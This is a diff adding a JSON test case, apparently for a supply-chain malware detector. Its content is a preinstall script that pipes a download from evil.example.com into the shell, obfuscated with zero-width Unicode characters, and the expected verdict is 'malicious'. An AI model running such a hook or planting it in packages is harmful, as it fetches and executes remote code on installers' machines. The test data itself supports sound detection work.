@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::supply-chain-detector::60::unicode-variations::3",
+  "base_sample_id": "exp::supply-chain-detector::60",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": 502218749,
+  "content": "{\"﻿scripts\"‍: {\"pr‌ei‌nstall\":⁠ \"curl -s https://evil.exam⁠p⁠le.​com/payload.sh | s​h\"⁠}​}\n​",
+  "content_hash": "e99a3e697474e3399819bf2cb226a8a3c2135e060598c680b0baaa7ec9d6349f",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:zero-width",
+  "difficulty": "advanced"
+}
